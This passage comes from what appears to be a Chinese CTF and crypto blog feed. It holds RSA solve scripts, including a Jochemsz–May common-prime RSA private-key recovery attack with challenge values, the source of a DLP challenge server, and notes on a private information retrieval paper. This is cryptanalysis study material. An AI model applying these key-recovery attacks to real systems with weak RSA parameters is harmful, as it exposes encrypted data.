class="number">1031017280402570438170620898712318729388693496281505970545089773056159408361089976043326257409484153676496618872695511886757246263767678359926139840259589</span>, <span class="number">5810623257398864636102157017590941697249663373518895766284006145133323872781161201115486747954218380724663488609430775453990670604106509150085186999990931</span>, <span class="number">7542808499447224707138321228343741470824637054080087292450358043864380124598503802315753890163439945471644252932590707145370017825629044183614059438568715</span>), (<span class="number">1031017280402570438170620898712318729388693496281505970545089773056159408361089976043326257409484153676496618872695511886757246263767678359926139840259589</span>, <span class="number">12514527222370163185889169516693864760989346283815092455145786866994205887817934689516423897037670094569679417702673800880867612010079794123302011503032979</span>, <span class="number">838904534475926157351308729240818407084954143783890603588577322003498109561730313914816741079988231626628323839347681718493076419655759210397234935526667</span>), (<span class="number">7934321504151848016580521002574844336171226047598370838640120531140912301800737265546469106621426048099833677640004660227767453182195309874035552908895749</span>, <span class="number">5362971084215426487776063906406933038339571667412402912065006500619578380006904603808786641086852920091627867874069854414757781438101918802034898550045331</span>, <span class="number">1748900714192807249109317611158943830937830460558493754638072787623072613667437058549182782275056393635453630420046451180946795578565976628109405510595851</span>), (<span class="number">7934321504151848016580521002574844336171226047598370838640120531140912301800737265546469106621426048099833677640004660227767453182195309874035552908895749</span>, <span class="number">12066875049186725037563076405509856102079254577708599600926787222480460395043678092209723790170304633936643796967312879841634722844075203775251723053087379</span>, <span class="number">8452804679164105798896330110261866894677513370854690443499853509483954628704210546950119931358508107480469559513289476607823736984539261601326230013637899</span>), (<span class="number">1230417539180549466793508503471921272431543137302174149778339809280030286763963777145531957537974334254817748546761634800890511776222024900818728405853701</span>, <span class="number">2430013099540483372244245938049404197953460394157816860687977434805442498428316202633376638362842795284433398895776030790499119572988606626252537829964435</span>, <span class="number">1329906716382101089747629329965011139454100278664981461584211492506767487727638715524124210457340661520140134851718762091766986740692646317283353979155723</span>), (<span class="number">1230417539180549466793508503471921272431543137302174149778339809280030286763963777145531957537974334254817748546761634800890511776222024900818728405853701</span>, <span class="number">9133917064511781922031258437152327261693143304454013549549758156666324513465089691034313787446294509129449327989019056217376060978961891599469362333006483</span>, <span class="number">8033810681353399639534641829067934203193783188961178150445992214367649502764412203925061359540792375365156063944961787518643928146665931290500178482197771</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p, q, d <span class="keyword">in</span> sol_list:</span><br><span class="line">    <span class="keyword">if</span> (n % p == <span class="number">0</span>):</span><br><span class="line">        q = n // p</span><br><span class="line">        d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">        m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line">    p, q = q, p</span><br><span class="line">    <span class="keyword">if</span> (n % p == <span class="number">0</span>):</span><br><span class="line">        q = n // p</span><br><span class="line">        d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">        m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line">    </span><br></pre></td></tr></table></figure><h3 id="common_rsa">common_rsa</h3><p>维纳的common prime rsa，用john andmay的方法copper能出，代码直接用github的：https://github.com/jvdsn/crypto-attacks/blob/5c7989ceac599f1f8e016b5afb0d2966759cd470/attacks/rsa/wiener_attack_common_prime.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> log</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> RR</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> ZZ</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">path = os.path.dirname(os.path.dirname(os.path.dirname(os.path.realpath(os.path.abspath(__file__)))))</span><br><span class="line"><span class="keyword">if</span> sys.path[<span class="number">1</span>] != path:</span><br><span class="line">    sys.path.insert(<span class="number">1</span>, path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> shared.small_roots <span class="keyword">import</span> jochemsz_may_integer</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">N, e, delta=<span class="number">0.25</span>, m_start=<span class="number">1</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Recovers the prime factors of a modulus and the private exponent if the private exponent is too small (Common Prime RSA version).</span></span><br><span class="line"><span class="string">    More information: Jochemsz E., May A., &quot;A Strategy for Finding Roots of Multivariate Polynomials with New Applications in Attacking RSA Variants&quot; (Section 5)</span></span><br><span class="line"><span class="string">    :param N: the modulus</span></span><br><span class="line"><span class="string">    :param e: the public exponent</span></span><br><span class="line"><span class="string">    :param delta: a predicted bound on the private exponent (d &lt; N^delta) (default: 0.25)</span></span><br><span class="line"><span class="string">    :param m_start: the m value to start at for the small roots method (default: 1)</span></span><br><span class="line"><span class="string">    :return: a tuple containing the prime factors of the modulus and the private exponent</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    gamma = <span class="number">1</span> - log(e, N)</span><br><span class="line">    <span class="keyword">assert</span> delta &lt;= <span class="number">1</span> / <span class="number">4</span> * (<span class="number">4</span> + <span class="number">4</span> * gamma - sqrt(<span class="number">13</span> + <span class="number">20</span> * gamma + <span class="number">4</span> * gamma ** <span class="number">2</span>)), <span class="string">&quot;Bound check failed.&quot;</span></span><br><span class="line"></span><br><span class="line">    x, y, z = ZZ[<span class="string">&quot;x, y, z&quot;</span>].gens()</span><br><span class="line"></span><br><span class="line">    f = e ** <span class="number">2</span> * x ** <span class="number">2</span> + e * x * (y + z - <span class="number">2</span>) - (y + z - <span class="number">1</span>) - (N - <span class="number">1</span>) * y * z</span><br><span class="line"></span><br><span class="line">    X = <span class="built_in">int</span>(RR(N) ** delta)</span><br><span class="line">    Y = <span class="built_in">int</span>(RR(N) ** (delta + <span class="number">1</span> / <span class="number">2</span> - gamma))</span><br><span class="line">    Z = <span class="built_in">int</span>(RR(N) ** (delta + <span class="number">1</span> / <span class="number">2</span> - gamma))</span><br><span class="line">    W = <span class="built_in">int</span>(RR(N) ** (<span class="number">2</span> + <span class="number">2</span> * delta - <span class="number">2</span> * gamma))</span><br><span class="line"></span><br><span class="line">    m = m_start</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">            logging.info(<span class="string">f&quot;Trying m = <span class="subst">&#123;m&#125;</span>, t = <span class="subst">&#123;t&#125;</span>...&quot;</span>)</span><br><span class="line">            strategy = jochemsz_may_integer.ExtendedStrategy([t, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">            <span class="keyword">for</span> x0, y0, z0 <span class="keyword">in</span> jochemsz_may_integer.integer_multivariate(f, m, W, [X, Y, Z], strategy):</span><br><span class="line">                d = x0</span><br><span class="line">                ka = y0</span><br><span class="line">                kb = z0</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">pow</span>(<span class="built_in">pow</span>(<span class="number">2</span>, e, N), d, N) == <span class="number">2</span>:</span><br><span class="line">                    p = (e * d - <span class="number">1</span>) // kb + <span class="number">1</span></span><br><span class="line">                    q = (e * d - <span class="number">1</span>) // ka + <span class="number">1</span></span><br><span class="line">                    <span class="keyword">return</span> p, q, d</span><br><span class="line"></span><br><span class="line">        m += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">253784908428481171520644795825628119823506176672683456544539675613895749357067944465796492899363087465652749951069021248729871498716450122759675266109104893465718371075137027806815473672093804600537277140261127375373193053173163711234309619016940818893190549811778822641165586070952778825226669497115448984409</span></span><br><span class="line">e = <span class="number">31406775715899560162787869974700016947595840438708247549520794775013609818293759112173738791912355029131497095419469938722402909767606953171285102663874040755958087885460234337741136082351825063419747360169129165</span></span><br><span class="line">c = <span class="number">97724073843199563126299138557100062208119309614175354104566795999878855851589393774478499956448658027850289531621583268783154684298592331328032682316868391120285515076911892737051842116394165423670275422243894220422196193336551382986699759756232962573336291032572968060586136317901595414796229127047082707519</span></span><br><span class="line">delta = <span class="number">0.132</span></span><br><span class="line"><span class="built_in">print</span>(delta)</span><br><span class="line">p, q, d = attack(n, e, delta)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n))) </span><br><span class="line"> </span><br></pre></td></tr></table></figure><h3 id="babydlp">babyDLP</h3><p>CryptoCTF（这比赛哥们是第十一名）原题sidestep，参数交互都没改，直接用原来的exp都能出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random, sys</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pow_d</span>(<span class="params">g, e, n</span>):</span><br><span class="line">    t, r = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">bin</span>(e)[<span class="number">2</span>:]:</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">4</span>: t += <span class="number">1</span></span><br><span class="line">        r = <span class="built_in">pow</span>(r, <span class="number">2</span>, n)</span><br><span class="line">        <span class="keyword">if</span> _ == <span class="string">&#x27;1&#x27;</span>: r = r * g % n</span><br><span class="line">    <span class="keyword">return</span> t, r</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ts</span>(<span class="params">m, p</span>):</span><br><span class="line">    m = m % p</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(m, (p - <span class="number">1</span>) // <span class="number">2</span>, p) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">die</span>(<span class="params">*args</span>):</span><br><span class="line">    pr(*args)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>(<span class="params">*args</span>):</span><br><span class="line">    s = <span class="string">&quot; &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, args))</span><br><span class="line">    sys.stdout.write(s + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sc</span>():</span><br><span class="line">    <span class="keyword">return</span> sys.stdin.readline().strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    border = <span class="string">&quot;|&quot;</span></span><br><span class="line">    pr(border*<span class="number">72</span>)</span><br><span class="line">    pr(border, <span class="string">&quot;Hi all cryptographers! Welcome to the Sidestep task, we do powing!!!&quot;</span>, border)</span><br><span class="line">    pr(border, <span class="string">&quot;You should solve a DLP challenge in some special way to get the flag&quot;</span>, border)</span><br><span class="line"></span><br><span class="line">    p = <span class="number">2</span> ** <span class="number">1024</span> - <span class="number">2</span> ** <span class="number">234</span> - <span class="number">2</span> ** <span class="number">267</span> - <span class="number">2</span> ** <span class="number">291</span> - <span class="number">2</span> ** <span class="number">403</span> - <span class="number">1</span></span><br><span class="line">    s = random.randint(<span class="number">2</span>, (p - <span class="number">1</span>) // <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        pr(<span class="string">&quot;| Options: \n|\t[T]ry the magic machine \n|\t[Q]uit&quot;</span>)</span><br><span class="line">        ans = sc().lower()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ans == <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">            pr(border, <span class="string">&quot;please send your desired integer: &quot;</span>)</span><br><span class="line">            g = sc()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                g = <span class="built_in">int</span>(g)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                die(border, <span class="string">&quot;The given input is not integer!&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> ts(g, p):</span><br><span class="line">                t, r = pow_d(g, s, p)</span><br><span class="line">                <span class="keyword">if</span> r == <span class="number">4</span>:</span><br><span class="line">                    die(border, <span class="string">f&#x27;Great! you got the flag: <span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    pr(border, <span class="string">f&quot;t, r = <span class="subst">&#123;t, r&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                pr(border, <span class="string">&quot;The given base is NOT valid!!!&quot;</span>)</span><br><span class="line">        <span class="keyword">elif</span> ans == <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">            die(border, <span class="string">&quot;Quitting ...&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            die(border, <span class="string">&quot;Bye bye ...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;第二次参加了，时间好快呀&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    
    <category term="RSA" scheme="http://sh1k4ku.github.io/tags/RSA/"/>
    
  </entry>
  
  <entry>
    <title>PIR</title>
    <link href="http://sh1k4ku.github.io/2022/08/03/2022/PIR/"/>
    <id>http://sh1k4ku.github.io/2022/08/03/2022/PIR/</id>
    <published>2022-08-03T02:22:08.000Z</published>
    <updated>2023-08-07T11:21:17.728Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Private Information Retrieval</strong></p><span id="more"></span><h1 id="introduction">introduction</h1><p>Henry Corrigan-Gibbs and DmitryKogan二人提出了一个新的PIR方案，使得处理时间变为了对数多项式/次线性级别，并且没有增加开销。</p><p><img src="/images/PIR/image-20220803103926186.png" alt="image-20220803103926186"></p><p><code>Our idea is to push the (necessary) linear-time server-side computation into a query-independent offlfflffline phase, which allows a subsequent online phase to complete in sublinear time</code></p><ol type="1"><li>In an <strong>offline</strong> phase, which takes place before theclient has decided which bit of the database it wants to retrieve, theclient fetches a one-time-use “hint” from the database servers.</li><li>In a subsequent <strong>online</strong> phase, which takes placeafter the client has decided which bit of the database it wants toretrieve, the client sends a query to the database servers. Given theservers’ answers to this query, along with the hint prefetched earlier,the client can recover its database bit of interest.</li></ol><h2 id="notation">notation</h2><p>$$ N : the;set ;of ;positive ;integers\</p><p>n : the ;set ;{1, 2, . . . , n}\</p>1^n : 长度为n的全为1的二进制字符\ s-subset of [n] :a;subset;of;size;exactly;s\<span class="math display">\[\begin{pmatrix}[n]\\s\end{pmatrix}\]</span><p>:the;set;of;all;s-subsets;of;[n]\ xS:choosing;x;independently;and;uniformly;at; random;from;the;set;S\ xD:choosing;x ∈ S; according ;to ;distribution ;D\ For;p ∈ [0,1],xBernoulli(p): choosing ;the ;bit ;b ;to; be ;‘1’ ;with ;probability;p ;and ;‘0’; with ;probability ;1 − p $$</p><h1 id="puncturable-pseudorandom-sets"><strong>Puncturable pseudorandomsets</strong></h1><p>非常重要的一个概念</p><p>还有术语“puncturable pseudorandom function（puncturable PRF）” and"puncturable pseudorandom set(PRPs)"</p><p>PRF key与函数f: [n] -&gt; [n]密切相关 <span class="math display">\[a\;PRF\;key\;punctured \;at \;point\;x^∗ ∈ [n]\; allows \;its \;holder\;to \;evaluate \;f \;at \;every \;point \;in\; [n],\; \\except\; at\;the\;punctured\; point\; x^∗\]</span> 也就是说punctured key不能对它的持有者揭示任何有关<span class="math display">\[f(x^*)\]</span>的信息</p><p>同样的， the key for a puncturable pseudorandom set is a compressedrepresentation of a pseudorandom set <em>S</em> <em>⊆</em> [<em>n</em>].The set key punctured at element <span class="math display">\[ x^∗ ∈ *S*\]</span>allows its holder to recover all elements of <em>S</em><em>except</em> the punctured element<span class="math display">\[ x^∗\]</span>. The punctured set key reveals nothing about <span class="math display">\[x^∗ \]</span>to its holder, apart from that factthat <span class="math display">\[x^∗\]</span> is not one of theremaining elements in <em>S</em>.</p><h2 id="defifinitions"><strong>Defifinitions</strong></h2><p>2.1部分介绍了三个重要算法 <span class="math display">\[设s: N\rightarrow N的函数满足s(n)\leq n.\\A\;puncturable\; pseudorandom\;set \;with \;set \;size\; s\; consists\;of \;a\; key\; space \;K\\a \;punctured-key \;space\; K_p\\\]</span></p><p>下面三个算法：</p><ol type="1"><li><span class="math display">\[Gen(1^\lambda,n)\rightarrowsk：传入\lambda 和size n，输出一个set \;key \;sk \in N\]</span></li><li><span class="math display">\[Punc(sk, i)\rightarrow sk_p：输入sk\inK 和i \in [n]，输出一个punctured  \;set \; key  \;sk_p \inK_p\]</span></li><li><span class="math display">\[Eval(sk）\rightarrow S：输入key \in K\bigcup K_p, 输出一个集合S \subseteq [n]\]</span></li></ol><p><strong>效率：</strong>对任何的安全参数<span class="math display">\[\lambda \in N \]</span>，上述三个算法以 <span class="math display">\[s(n) * poly(\lambda, logn)\]</span>的时间运行</p><p><strong>正确性</strong>：对任何<span class="math display">\[ \lambda, n \in N\]</span> ，设取样<span class="math display">\[sk \leftarrowGen(1^\lambda, n)\]</span>，计算<span class="math display">\[S\leftarrow Eval(sk)\]</span>，一定有以下：</p><ol type="1"><li><span class="math display">\[S \in \begin{pmatrix}[n]\\s\end{pmatrix}\]</span></li><li><span class="math display">\[对任意i \in S，Eval(Punc(sk, i)) = S\backslash \{i\}\]</span></li></ol><p><strong>安全性</strong>：首先引入Game 1 $$ Game ;1(Puncturable;pseudorandom ;set ;security).\ For ;,n N, and ;a ;puncturable;pseudorandom ;set;=(Gen, Punc, Eval)\定义如下在挑战者和对手之间的游戏：\ -The;challenger;executes;the;following ;steps:\ <span class="math display">\[\begin{align}\    &amp;1.sk \leftarrow Gen(1^\lambda,n)&amp;\\    &amp;2.S \leftarrow Eval(sk)&amp;\\    &amp;3.x^*\stackrel{R}{\longleftarrow}S&amp;\\    &amp;4.sk_p\stackrel{R}{\longleftarrow}Punc(sk, x^*)&amp;\\        并将1^\lambda和sk_p发送给对手。\\-对手输出一个整数x^{&#39;} \in [n]\\如果x^{&#39;} = x^*则认为对手获胜\end{align}\]</span>^*则认为对手获胜 \end{align} $$ <img src="/images/PIR/image-20220803131344272.png" alt="image-20220803131344272"></p><p>这里没太看懂。。</p><h2 id="constructions"><strong>Constructions</strong></h2><p>关于2.2部分，个人的浅薄理解是给出了一些存在性的证明，如下所述。 <span class="math display">\[Fact\;2 \;(Perfectly \;secure \;puncturable \;pseudorandom\; set with\;linear-sized\; keys):\\对任何函数s:N \rightarrow N \;with\;s(n) \leqslant n,\;总有一个perfectly\;secure\; puncturable\; pseudorandom \;set \;with \;set \;size \;s\\以及，对确定的n来说，the \;set\; keys \;and \;punctured\;keys\;的大小都是(s(n)+O(1))log\;n bits\]</span></p><p>$$ <span class="math display">\[\begin{align}\&amp;Theorem \;3 \;(puncturable\; pseudorandom\; set\; with\; short\;keys \;from\; puncturable\; PRFs):&amp;\\&amp;\quad假设存在一个\epsilon_F-secure\;puncturable\;PRF,它对于安全的参数\lambda和输入的n,有长度为\kappa(\lambda,n)的keys和长度为\kappa_p(\lambda,n)&amp;\\&amp;\quad的punctured\;keys,那么存在一个大小为\Theta(\sqrt{n})的\epsilon-secure\;puncturable \;pseudorandom \;set，对于\lambda和n，有：&amp;\\    &amp;\qquad1.set\; keys\; of\; length\; κ(λ, n) + O(log \;n)\;bits\; and&amp;\\    &amp;\qquad2.punctured\; keys\; of \;length\; κ_p(λ, n) + O(log\;n)\; bits, and&amp;\\    &amp;\qquad3.\epsilon(λ, n) = poly(λ, n) · ( \epsilon_F +2^{−λ}).&amp;\\\end{align}\]</span>3.(λ, n) = poly(λ, n) · ( _F + 2^{−λ}).&amp;\\end{align} $$</p><p>然后构造了一个puncturable pseudorandom set来证明上述Theorem： $$Construction;4 ;(Puncturable; pseudorandom ;set ;from ;puncturable;PRF).\ Given; a ;puncturable; PRF ;F = (PRFGen, PRFPunc, PRFEval),\ we;construct ;a ;puncturable ;pseudorandom; set ;_F = (Gen, Punc,Eval);with; set ;size; s(n) ;:= \ <span class="math display">\[\begin{align}\&amp;\psi_F.Gen(1^\lambda, n) \rightarrow sk&amp; \\    &amp;\quad-重复以下最多\lambda次：&amp;\\        &amp;\qquad ·k \leftarrow PRFGen(1^\lambda, n).&amp;\\        &amp;\qquad ·计算S \leftarrow{PRFEval(k,1),PRFEval(k,2),···，PRFEval(k,s(n))}&amp;\\        &amp;\qquad ·如果|S| = s(n),停止并输出sk\leftarrow(n,k).输出⊥（这里没懂，输出垂直？）&amp;\\    &amp;\quad-在运行\lambda次后循环不成功，输出⊥&amp;\\\\&amp;\psi_F.Punc(sk,i) \rightarrow sk_p&amp; \\    &amp;\quad-将密钥解析成(n, k).&amp;\\    &amp;\quad-找到最小的l满足PRFEval(k,l)=i.&amp;\\        &amp;\qquad\;如果不存在这样的l，输出⊥&amp;\\    &amp;\quad-计算k_p \leftarrow PRFPunc(k,l),并输出sk_p \leftarrow(n,k_p).&amp;\\\\&amp;\psi_F.Eval(sk) \rightarrow S&amp; \\    &amp;\quad-将密钥解析成(n,k).&amp;\\    &amp;\quad-输出集合S \leftarrow{PRFEval(k,1),PRFEval(k,2),···，PRFEval(k,s(n))}.&amp;\\    &amp;\quad-(If \;k\; is\; punctured \;at\; some \;value, \;skip\;this \;value\; when\; computing\; S).&amp;\\\end{align}\]</span>(If ;k; is; punctured ;at; some ;value, ;skip; this;value; when; computing; S).&amp;\ \end{align} <span class="math display">\[注意：Gen失败的概率很小，但不代表不会失败，我们可以让sk=⊥是某些固定的集合（例如[s])来保证上述theorem完全正确。\]</span> Corollary;6. ;Assuming; that ;pseudorandom ;generators;(PRGs); exist,\ there ;exists; ;a ;secure ;puncturable; pseudorandom;set; with ;set ;size; Θ() $$ theorem 7引入了一个fast membershiptesting的概念，涉及到一个InSet函数，运行速度是poly的，其实就是判断i是否在PRPs.Eval(sk)中，不展开写了。</p><h2 id="shifting-puncturable-pseudorandom-sets"><strong>Shiftingpuncturable pseudorandom sets</strong></h2><p>引入了两个PRPs的性质： <span class="math display">\[\begin{align*}&amp;1.GenWith(1^\lambda,n,i) \rightarrow sk,\;输出的sk满足i\inEval(sk)&amp;\\&amp;2.Shift(sk, \delta) \rightarrowsk^{&#39;}，即输出的sk^{&#39;}满足Eval(sk^{&#39;}) = {i+\delta\;|\;i \inEval(sk)},对Eval的结果做了一个shift&amp;\end{align*}\]</span></p><p>不失一般性，可以假设任何PRs都有这两条性质</p><h1 id="two-server-pir-with-sublinear-online-time"><strong>Two-serverPIR with sublinear online time</strong></h1><h2 id="defifinition"><strong>Defifinition</strong></h2><p>分为这五步： <span class="math display">\[\begin{align}\    &amp;1.client使用Setup算法生成密钥ck和hint\;q_h，发送q_h给offline\;server。注意Setup算法可提前运行。&amp;\\    &amp;2.offline\;server接收到q_h后运行Hint算法，生成hint\;h并发给clinet。&amp;\\    &amp;3.client决定index\;i后，传ck和i给Query算法，生成query\;q并发给online\;server。&amp;\\    &amp;4.online\;server传q给Answer算法，算出a返回给client。 &amp;\\    &amp;5.client传h和a到Reconstruct算法，输出数据库的第i个比特。&amp;\\\end{align}\]</span> 综上，offline/online PIR scheme是五个算法（Setup, Hint, Query,Answer, Reconstruct)组成的五元组： <span class="math display">\[\begin{align}\    &amp;Setup(1^\lambda,n) \rightarrow(ck, q_h)，\lambda是安全的参数&amp;\\    &amp;Hint(x,q_h) \rightarrow h，x是数据库中的n个数据 &amp;\\    &amp;Query(ck,i) \rightarrow q &amp;\\    &amp;Answer^x(q) \rightarrow a &amp;\\    &amp;Reconstruct(h,a) \rightarrow x_i &amp;\\\end{align}\]</span></p><h2 id="new-constructions"><strong>New constructions</strong></h2><p>基本上是从原始PIR到计算安全的PIR再到加入可穿刺的伪随机集的PIR版本</p><p>下图给了运行效率的上界，后面也说了如果只考虑计算安全（舍弃数据统计安全）就能降低开销。</p><p><img src="/images/PIR/image-20220828145823279.png" alt="image-20220828145823279"></p><p>Two-server computational offlfflffline/online PIR:</p><p><img src="/images/PIR/image-20220828150129012.png" alt="image-20220828150129012"></p><p>引入puncturable pseudorandom sets后，PIR的效率可进一步提高：</p><p><img src="/images/PIR/image-20220828151023565.png" alt="image-20220828151023565"></p><h3 id="construction-16-two-server-pir-with-sublinear-online-time"><strong>Construction16</strong> <strong>(Two-server PIR with sublinear onlinetime)</strong></h3><p><span class="math display">\[\begin{align}&amp;还是那些配置:s:N \rightarrow N ,\psi = (Gen, Punc,Eval)\;with\;key\;space K,punctured-key\;space\; K_p,&amp;\\&amp;extended\;by\;routines(Shift,GenWith),\;Throughout, let\;m :=(n/s(n))log\;n. &amp;\\&amp;Offline\;phase: &amp;\\    &amp;\quad Setup(1^\lambda,n) \rightarrow ck,q_h: &amp;\\        &amp;\qquad sk \leftarrow Gen(1^\lambda,n) &amp;\\        &amp;\qquad sample\;\delta_1,...,\delta_m\stackrel{R}{\longleftarrow}[n]&amp;\\        &amp;\qquad ck \leftarrow (sk,\delta_1,...,\delta_m)&amp;\\        &amp;\qquad output\;ck\;and\;q_h \leftarrow sk&amp;\\\\    &amp;\quad Hint(q_h,x \in \{0,1\}^n)\rightarrow h \in \{0,1\}^m&amp;\\        &amp;\qquad parse\;q_h\;as\;sk \in K\;and\;\delta\in [n]^m&amp;\\        &amp;\qquad for\;j=1,...,m\;do:&amp;\\            &amp;\qquad\quad S_j \leftarrowEval(Shift(sk,\delta_j))&amp;\\            &amp;\qquad\quad h_j \leftarrow \sum_{i\inS_j}x_i\;mod\;2&amp;\\           &amp;\qquad output\;h \leftarrow(h_1,...,h_m)&amp;\\\\&amp;Online\; phase &amp;\\    &amp;\quad Query(ck, i\in [n]) \rightarrow q\in K_p&amp;\\        &amp;\qquad parse\;ck\;as\;sk\in K\;and\;\delta\in[n]^m&amp;\\        &amp;\qquadsample\;a\;bit\;b\stackrel{R}{\longleftarrow}Bernouli(\frac{s-1}{n})&amp;\\        &amp;\qquad find\;a\;j\in[m]\;s.t.\;i-\delta_j \inEval(sk)&amp;\\        &amp;\qquad if\;such\;a\;j\in[m]\;exists:&amp;\\            &amp;\qquad\quad sk_q \leftarrow Shift(sk,\delta_j)&amp;\\        &amp;\qquad otherwise:&amp;\\            &amp;\qquad\quad j 